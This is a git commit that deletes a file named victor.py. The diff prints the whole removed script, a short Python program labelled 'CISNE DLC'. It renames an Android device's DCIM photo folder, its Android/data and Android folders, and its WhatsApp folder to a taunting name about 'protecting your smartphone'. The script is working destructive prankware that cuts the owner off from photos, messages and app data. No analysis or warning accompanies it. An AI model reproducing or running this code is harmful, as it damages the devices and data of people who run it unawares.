d01df994a796de9e03175af375813344551943ef
victorlindo99 <72378343+victorlindo99@users.noreply.github.com>
2020-10-05 06:21:02 -0300

    Delete victor.py

--- victor.py
+++
@@ -1,6 +0,0 @@
-#CISNE DLC
-import os
-os.rename("/sdcard/DCIM", "/sdcard/👻CISNE PROTEGENDO SEU SMARTPHONE, KK")
-os.rename("/storage/emulated/0/Android/data","/storage/emulated/0/Android/👻CISNE PROTEGENDO SEU SMARTPHONE, KK")
-os.rename("/sdcard/WhatsApp","/sdcard/👻CISNE PROTEGENDO SEU SMARTPHONE, KK")
-os.rename("/sdcard/Android","/sdcard/👻CISNE PROTEGENDO SEU SMARTPHONE, KK")
